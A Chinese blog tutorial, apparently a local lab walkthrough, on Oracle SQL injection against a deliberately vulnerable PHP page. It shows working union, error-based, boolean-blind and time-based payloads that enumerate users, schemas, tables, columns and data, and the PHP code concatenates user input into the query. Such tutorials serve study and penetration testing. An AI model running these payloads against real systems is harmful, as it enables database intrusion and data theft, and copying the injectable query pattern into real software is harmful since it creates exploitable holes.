$sql &#x3D; &quot;select * from hr.JOB_HISTORY where JOB_ID&#x3D;&#39;&quot;.$id.&quot;&#39;&quot;;&#x2F;&#x2F;sql语句</span><br><span class="line">    $ora_test &#x3D; oci_parse($conn,$sql);  &#x2F;&#x2F;编译sql语句 </span><br><span class="line">    oci_execute($ora_test,OCI_DEFAULT);  &#x2F;&#x2F;执行 </span><br><span class="line">	</span><br><span class="line">	echo &quot;-------------------------------------------------&lt;br&gt;&quot;;</span><br><span class="line">	echo &quot;Oracle语句：&quot;.$sql;</span><br><span class="line">	echo &quot;&lt;h2&gt;查询结果&lt;&#x2F;h2&gt;&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo &#39;&lt;table border&#x3D;&quot;1&quot; width&#x3D;&quot;1200&quot; align&#x3D;&quot;left&quot;&gt;&#39;;</span><br><span class="line">    while($r&#x3D;oci_fetch_row($ora_test))  &#x2F;&#x2F;取回结果 </span><br><span class="line">    &#123; </span><br><span class="line">	echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">      $i&#x3D;0;</span><br><span class="line">      &#x2F;&#x2F;echo $ora_test[0]; </span><br><span class="line">      echo &quot;&lt;td&gt;&quot;;</span><br><span class="line">	  echo &quot;EMPLOYEE_ID:&quot;.$r[$i++].&quot;  &lt;&#x2F;t&gt; &lt;br&gt;&quot;;</span><br><span class="line">	  echo &quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">	  </span><br><span class="line">      echo &quot;&lt;td&gt;&quot;;</span><br><span class="line">	  echo &quot;START_DATA:&quot;.$r[$i++].&quot;  &lt;&#x2F;t&gt;&lt;br&gt;  &quot;;</span><br><span class="line">	  echo &quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">      </span><br><span class="line">	  echo &quot;&lt;td&gt;&quot;;</span><br><span class="line">	  echo &quot;END_DATA:&quot;.$r[$i++].&quot;  &lt;&#x2F;t&gt;&lt;br&gt;  &quot;;</span><br><span class="line">	  echo &quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">      </span><br><span class="line">	  echo &quot;&lt;td&gt;&quot;;</span><br><span class="line">	  echo &quot;JOB_ID:&quot;.$r[$i++].&quot;  &lt;&#x2F;t&gt;&lt;br&gt;  &quot;;</span><br><span class="line">	  echo &quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">      </span><br><span class="line">	  echo &quot;&lt;td&gt;&quot;;</span><br><span class="line">	  echo &quot;DEPARTMENT_ID:&quot;.$r[$i++].&quot;  &lt;&#x2F;t&gt;&lt;br&gt;  &quot;;</span><br><span class="line">	  echo &quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">	  </span><br><span class="line">	echo &quot;&lt;&#x2F;tr&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">	echo &quot;&lt;&#x2F;table&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  oci_close($conn);&#x2F;&#x2F;关闭连接</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=IT_PROG">http://127.0.0.1/oracle.php?id=IT_PROG</a></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105153842019.png" alt="image-20210105153842019"></p>
<p>可以执行则搭建成功。</p>
<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>正常执行，回显如下图</p>
<p>select * from hr.JOB_HISTORY where JOB_ID=’IT_PROG’ union select  1,null,null,(select banner from sys.v_$version where rownum=1),null from dual–’</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103155239766.png" alt="image-20210103155239766"></p>
<h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; order by 6--</span><br></pre></td></tr></table></figure>
<p>报错，则为5列</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103154517279.png" alt="image-20210103154517279"></p>
<h2 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select null,null,null,null,null from dual--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103155217979.png" alt="image-20210103155217979"></p>
<h2 id="判断每个字段的数据类型"><a href="#判断每个字段的数据类型" class="headerlink" title="判断每个字段的数据类型"></a>判断每个字段的数据类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,&#39;4&#39;,null from dual--</span><br></pre></td></tr></table></figure>
<p>如下图：判断为第一列int型，第四列char型</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103155450649.png" alt="image-20210103155450649"></p>
<p>报错如下，则为前后的数据类型不匹配：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: oci_fetch_row(): ORA-24374: define not done before fetch or execute and fetch in D:\phpStudy_x64_8.0.1\WWW\oracle.php on line 27</span><br></pre></td></tr></table></figure>
<p>存疑：DATA类型如何转换？如何注入？</p>
<h2 id="判断当前数据库的用户"><a href="#判断当前数据库的用户" class="headerlink" title="判断当前数据库的用户"></a>判断当前数据库的用户</h2><p>payload:<code>select SYS_CONTEXT(&#39;USERENV&#39;,&#39;CURRENT_USER&#39;)  from dual</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,(select SYS_CONTEXT(&#39;USERENV&#39;,&#39;CURRENT_USER&#39;)  from dual),null from dual--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103160710386.png" alt="image-20210103160710386"></p>
<h2 id="判断当前数据库的版本"><a href="#判断当前数据库的版本" class="headerlink" title="判断当前数据库的版本"></a>判断当前数据库的版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103160949821.png" alt="image-20210103160949821"></p>
<h2 id="暴破数据库名"><a href="#暴破数据库名" class="headerlink" title="暴破数据库名"></a>暴破数据库名</h2><p>payload：<code>select owner from all_tables where rownum=1</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,(select owner from all_tables where rownum&#x3D;1),null from dual--</span><br></pre></td></tr></table></figure>
<p>为SYS</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103161047470.png" alt="image-20210103161047470"></p>
<p>判断下一个数据库</p>
<p>关键payload：<code> owner &lt;&gt;&#39;SYS&#39;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,(select owner from all_tables where rownum&#x3D;1 and owner &lt;&gt;&#39;SYS&#39;),null from dual--</span><br></pre></td></tr></table></figure>
<p>为：OUTLN</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103161144159.png" alt="image-20210103161144159"></p>
<p>判断下下个数据库</p>
<p>关键payload：<code>and owner &lt;&gt;&#39;SYS&#39; and owner &lt;&gt;&#39;OUTLN&#39;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,(select owner from all_tables where rownum&#x3D;1 and owner &lt;&gt;&#39;SYS&#39; and owner &lt;&gt;&#39;OUTLN&#39;),null from dual--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103161350617.png" alt="image-20210103161350617"></p>
<p>得到的数据库有：SYS、OUTLN、SYSTEM</p>
<p>后续可以不断的去暴破，直到暴破所有的数据库名为止（报错即为没有下一个数据库了）。</p>
<p>注意：表一定要大写。</p>
<h2 id="当前用户的表的获取"><a href="#当前用户的表的获取" class="headerlink" title="当前用户的表的获取"></a>当前用户的表的获取</h2><p>payload：<code>select table_name from user_tables where rownum=1</code></p>
<p>（<code>select table_name from all_tables 查看所有表</code>）</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103161748313.png" alt="image-20210103161748313"></p>
<p>得到表名LOGMNR_SESSION_EVOLVE$  </p>
<p>同样使用 <code>and table_name &lt;&gt;&#39;LOGMNR_SESSION_EVOLVE$&#39;</code>遍历所有的表名</p>
<p>同时注意此处得到的表名有可能重复，加上distinct去重</p>
<p>即：<code>select distinct table_name from user_tables where rownum=1 and table_name &lt;&gt; &#39;LOGMNR_SESSION_EVOLVE$&#39;</code></p>
<h2 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h2><p>payload:<code>select column_name from user_tab_columns where table_name=&#39;XXX&#39; and rownum=1</code></p>
<p>获取第一列：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,(select column_name from user_tab_columns where table_name&#x3D;&#39;LOGMNR_SESSION_EVOLVE$&#39; and rownum&#x3D;1),null from dual--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103162551520.png" alt="image-20210103162551520"></p>
<p>得到第一列：BRANCH_LEVEL  </p>
<p>获取第二列：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,(select column_name from user_tab_columns where table_name&#x3D;&#39;LOGMNR_SESSION_EVOLVE$&#39; and rownum&#x3D;1 and column_name&lt;&gt;&#39;BRANCH_LEVEL&#39;),null from dual--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103162722625.png" alt="image-20210103162722625"></p>
<p>得到第二列：SESSION#  </p>
<h2 id="暴数据"><a href="#暴数据" class="headerlink" title="暴数据"></a>暴数据</h2><p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103191758410.png" alt="image-20210103191758410"></p>
<p>以hr库中的COUNTER表为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,(select CONCAT(COUNTRY_ID,COUNTRY_NAME) from hr.COUNTRIES where rownum&#x3D;1),null from dual--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103200138597.png" alt="image-20210103200138597"></p>
<p>select CONCAT(COUNTRY_ID,COUNTRY_NAME,REGION_ID) from hr.COUNTRIES会报错，因为REGION_ID为int类型</p>
<p>oracle的字符连接用||符号，或者用concat，但是concat只能连接字符串(可以嵌套实现连接多个字符串)，输出不友好，所以我这里用||符号连接输出的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; union select 1,null,null,(select COUNTRY_ID||&#39;~&#39;||COUNTRY_NAME||&#39;~&#39;||REGION_ID from hr.COUNTRIES where rownum&#x3D;1),null from dual--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103201816349.png" alt="image-20210103201816349"></p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>payload：<code>select count(*) from user_tables</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and (select count (*) from user_tables)&gt;0 --</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103203344661.png" alt="image-20210103203344661"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103203358519.png" alt="image-20210103203358519"></p>
<p><code>&gt;0</code>可以正常执行，<code>&lt;0</code>执行异常，则存在注入点</p>
<h2 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h2><h3 id="utl-inaddr-get-host-name"><a href="#utl-inaddr-get-host-name" class="headerlink" title="utl_inaddr.get_host_name( )"></a>utl_inaddr.get_host_name( )</h3><p>获取ip 地址,其参数如果解析不了会报错，显示传递的参数。如果其参数是一个SQL语句，那么报错就会把结果给显示出来。</p>
<p>payload：<code>1=utl_inaddr.get_host_name(select user from dual)</code></p>
<p>添加几个飘号容易识别</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 1&#x3D;utl_inaddr.get_host_name((select &#39;~&#39;||user||&#39;~&#39; from dual))--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103204936713.png" alt="image-20210103204936713"></p>
<h3 id="ctxsys-drithsx-sn-："><a href="#ctxsys-drithsx-sn-：" class="headerlink" title="ctxsys.drithsx.sn()："></a>ctxsys.drithsx.sn()：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x3D;ctxsys.drithsx.sn(1,(select user from dual))</span><br></pre></td></tr></table></figure>
<p>该函数在查询关于主题的对应关键词时，会报错显示出第二个参数的结果</p>
<h3 id="XMLType"><a href="#XMLType" class="headerlink" title="XMLType():"></a>XMLType():</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><br></pre></td></tr></table></figure>
<h3 id="dbms-xdb-version-checkin"><a href="#dbms-xdb-version-checkin" class="headerlink" title="dbms_xdb_version.checkin()"></a>dbms_xdb_version.checkin()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null--</span><br></pre></td></tr></table></figure>
<h3 id="bms-xdb-version-makeversioned"><a href="#bms-xdb-version-makeversioned" class="headerlink" title="bms_xdb_version.makeversioned()"></a>bms_xdb_version.makeversioned()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure>
<h3 id="dbms-xdb-version-uncheckout"><a href="#dbms-xdb-version-uncheckout" class="headerlink" title="dbms_xdb_version.uncheckout()"></a>dbms_xdb_version.uncheckout()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure>
<h3 id="dbms-utility-sqlid-to-sqlhash"><a href="#dbms-utility-sqlid-to-sqlhash" class="headerlink" title="dbms_utility.sqlid_to_sqlhash()"></a>dbms_utility.sqlid_to_sqlhash()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure>
<h3 id="ordsys-ord-dicom-getmappingxpath"><a href="#ordsys-ord-dicom-getmappingxpath" class="headerlink" title="ordsys.ord_dicom.getmappingxpath()"></a>ordsys.ord_dicom.getmappingxpath()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)--</span><br></pre></td></tr></table></figure>
<h3 id="decode"><a href="#decode" class="headerlink" title="decode()"></a>decode()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select decode(substr(user,1,1),&#39;S&#39;,(1&#x2F;0),0) from dual) --</span><br></pre></td></tr></table></figure>
<p>注意：decode()不会显示报错信息，需要通过页面来判断。当substr(user,1,1)=‘S’页面报错，其他情况页面无报错也不会显示数据。类似盲注。</p>
<p>decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值)</p>
<p>意思是：当条件等于值1时就得到返回值1~~~~</p>
<p>eg：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 1&#x3D;(select decode(substr(user,1,1),&#39;A&#39;,(1&#x2F;0),0) from dual) --</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 1&#x3D;(select decode(substr(user,1,1),&#39;B&#39;,(1&#x2F;0),0) from dual) --</span><br></pre></td></tr></table></figure>
<p>上述测试结果为页面正常，不显示任何数据，也不报错。</p>
<p>显示如下的结果，说明当前用户的首字母是S，代码decode(substr(user,1,1),’S’,(1/0),0)中</p>
<p>substr(user,1,1)=’S’时，就返回(1/0)的值，但是0不能为分母，所以报错！</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104103042711.png" alt="image-20210104103042711"></p>
<p>其他的暴数据库、表、字段的过程和之前一致。</p>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>在Oracle布尔盲注实验中，可以是普通猜解的方法也可以使用某些函数来辅助猜解，如前面提到的decode函数，以及instr函数等。接下来我们测试普通猜解方法、decode方法和instr方法。</p>
<h2 id="普通猜解方法（substr-ascii）"><a href="#普通猜解方法（substr-ascii）" class="headerlink" title="普通猜解方法（substr+ascii）"></a>普通猜解方法（substr+ascii）</h2><h3 id="获取当前用户下的数据表长度"><a href="#获取当前用户下的数据表长度" class="headerlink" title="获取当前用户下的数据表长度"></a>获取当前用户下的数据表长度</h3><p>payload：SELECT LENGTH(table_name) from user_tables where rownum=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 19&#x3D;(SELECT LENGTH(table_name) from all_tables where rownum&#x3D;1)--</span><br></pre></td></tr></table></figure>
<p>页面正常显示，判断当前的用户下表长度为19</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104104448246.png" alt="image-20210104104448246"></p>
<h3 id="获取数据表名的每个字符"><a href="#获取数据表名的每个字符" class="headerlink" title="获取数据表名的每个字符"></a>获取数据表名的每个字符</h3><p>猜测数据库表的每个字符，使用字符截取函数substr和ascii函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 68&#x3D;((select ascii(substr(table_name,1,1)) from all_tables WHERE rownum&#x3D;1))--</span><br></pre></td></tr></table></figure>
<p><em>substr</em>(string, start,length)</p>
<p>只有页面正常显示才能推出每个字符的ASCII码。当前数据表的首字母的ASCII是65，也即A，同理依次遍历得到数据表名。</p>
<h3 id="获取数据表的字段长度"><a href="#获取数据表的字段长度" class="headerlink" title="获取数据表的字段长度"></a>获取数据表的字段长度</h3><p>以HR.COUNTRIES表为例，</p>
<p>payload：select LENGTH(column_name) from user_tab_columns where table_name=’XXX’ and rownum=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 10&#x3D;(select LENGTH(COLUMN_NAME) from all_tab_columns where table_name&#x3D;&#39;COUNTRIES&#39; and rownum&#x3D;1)--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104110539382.png" alt="image-20210104110539382"></p>
<p>没有报错，显示正常，说明长度为10</p>
<h3 id="获取数据表下的字段名的每个字符"><a href="#获取数据表下的字段名的每个字符" class="headerlink" title="获取数据表下的字段名的每个字符"></a>获取数据表下的字段名的每个字符</h3><p>payload：select ascii(substr(column_name,1,1)) from all_tab_columns where table_name=’XXX’ and rownum=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 67&#x3D;(select ascii(substr(column_name,1,1)) from all_tab_columns where table_name&#x3D;&#39;COUNTRIES&#39; and rownum&#x3D;1)--</span><br></pre></td></tr></table></figure>
<p>页面显示正常，则说明第一个字符为C，这个过程也可以用burp去暴破</p>
<p>ASCII码范围：0~127</p>
<h3 id="获取字段长度"><a href="#获取字段长度" class="headerlink" title="获取字段长度"></a>获取字段长度</h3><p>payload：select length(CONCAT(COUNTRY_ID,COUNTRY_NAME)) from XXX where rownum=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 11&#x3D;(select length(CONCAT(COUNTRY_ID,COUNTRY_NAME)) from hr.COUNTRIES where rownum&#x3D;1)--</span><br></pre></td></tr></table></figure>
<h3 id="获取字段内容的每个字符"><a href="#获取字段内容的每个字符" class="headerlink" title="获取字段内容的每个字符"></a>获取字段内容的每个字符</h3><p>payload：select CONCAT(COUNTRY_ID,COUNTRY_NAME) from XXX where rownum=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 65&#x3D;(select ascii(substr(CONCAT(COUNTRY_ID,COUNTRY_NAME),1,1)) from hr.COUNTRIES where rownum&#x3D;1)--</span><br></pre></td></tr></table></figure>
<p>逐个遍历即可得到完整字段内容。</p>
<p>注：1、有时候直接使用substr也可以进行注入，加入burp遍历更方便，不用依次转换ascii码的值。被过滤时，再考虑使用ascii转换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and &#39;A&#39;&#x3D;(select substr(CONCAT(COUNTRY_ID,COUNTRY_NAME),1,1) from hr.COUNTRIES where rownum&#x3D;1)--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104120227037.png" alt="image-20210104120227037"></p>
<p>2、布尔盲注：先猜长度，再猜字段。</p>
<h2 id="DECODE函数方式"><a href="#DECODE函数方式" class="headerlink" title="DECODE函数方式"></a>DECODE函数方式</h2><p>Decode的使用方法：<strong>decode</strong>(字段或字段的运算，值1，值2，值3）</p>
<p>​    这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回值3<br> 当然值1，值2，值3也可以是表达式</p>
<h3 id="判断当前用户名长度"><a href="#判断当前用户名长度" class="headerlink" title="判断当前用户名长度"></a>判断当前用户名长度</h3><p>select decode(length(user),4,1,0) from dual</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 1&#x3D;(select decode(length(user),6,1,0) from dual)--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104135314061.png" alt="image-20210104135314061"></p>
<p>显示正常，说明用户长度为6</p>
<h3 id="获取当前用户名内容的每个字符"><a href="#获取当前用户名内容的每个字符" class="headerlink" title="获取当前用户名内容的每个字符"></a>获取当前用户名内容的每个字符</h3><p>select decode(substr(user,1,1),’S’,1,0) from dual</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 1&#x3D;(select decode(substr(user,1,1),&#39;S&#39;,1,0) from dual)--</span><br></pre></td></tr></table></figure>
<p>逐个遍历即可得到完整字段内容。</p>
<p>暴破表、字段内容的方法同上。</p>
<h2 id="INSTR函数"><a href="#INSTR函数" class="headerlink" title="INSTR函数"></a>INSTR函数</h2><p>函数instr的使用方法：instr(string1,string2)，在string1中找到string2所在的位置，找到返回其索引。</p>
<p>eg：SELECT INSTR(‘substr’, ‘str’) from dual;</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104140638636.png" alt="image-20210104140638636"></p>
<p>select instr((select user from dual),’TEST’) from dual; –返回值是1 说明用户中有TEST字符串</p>
<p>select instr((select length(user) from dual),4) from dual;– 返回值是1 说明用户的长度是4</p>
<p>select instr((select length(table_name) from user_tables where rownum=1),4) from dual; –返回值是1 说明当前用户的第一个表的名称长度是4</p>
<p>该如何判断名称每个字符呢？</p>
<p>select instr(substr((select table_name from user_tables where rownum=1),1,1),’D’) from dual; –返回值是1 书名表名的第一个字符是D，后续可以通过BP去暴破。</p>
<h1 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h1><p>在Oracle延时注入利用过程中需要使用DECODE、DBMS_PIPE.RECEIVE_MESSAGE等函数来延时数据库的处理时间，最后测试者可以通过网页的加载时间来判断注入结果。</p>
<p>DECODE函数的使用方法此处不再讨论。</p>
<p>DBMS_PIPE.RECEIVE_MESSAGE(‘RDS’,5)表示从RDS管道返回的数据需要等待5秒，一般情况下可以以PUBLIC权限使用该函数。</p>
<p>payload：and 1= dbms_pipe.receive_message(‘RDS’, 5)–</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 1&#x3D; dbms_pipe.receive_message(&#39;RDS&#39;, 5)-- </span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104141922131.png" alt="image-20210104141922131"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104142006833.png" alt="image-20210104142006833"></p>
<p>可以看到页面网络加载时间是5S，可以看到注入效果。注意该函数的返回值是1</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104142246720.png" alt="image-20210104142246720"></p>
<p>后续步骤需要使用DECODE函数。</p>
<p>DECODE(condition,value,dbms_pipe.receive_message(‘RDS’, 5),0)，意思是当condition=value就返回dbms_pipe.receive_message(‘RDS’, 5)，那么页面就等待5秒时间，从而达到延时注入的目的。</p>
<p>payload：select decode(substr(user,1,1),’T’,dbms_pipe.receive_message(‘RDS’,5),0) from dual</p>
